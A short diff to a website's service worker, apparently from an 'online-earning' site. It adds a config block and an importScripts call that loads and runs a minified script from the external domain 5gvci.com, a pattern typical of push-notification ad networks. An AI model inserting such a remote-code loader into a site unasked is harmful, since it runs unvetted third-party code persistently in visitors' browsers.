@@ -89,3 +89,11 @@ self.addEventListener("notificationclick", (e) => {
   e.notification.close();
   e.waitUntil(clients.openWindow(e.notification.data?.url || "/online-earning/listen-enjoy-earn/"));
 });
+
+
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10745990
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
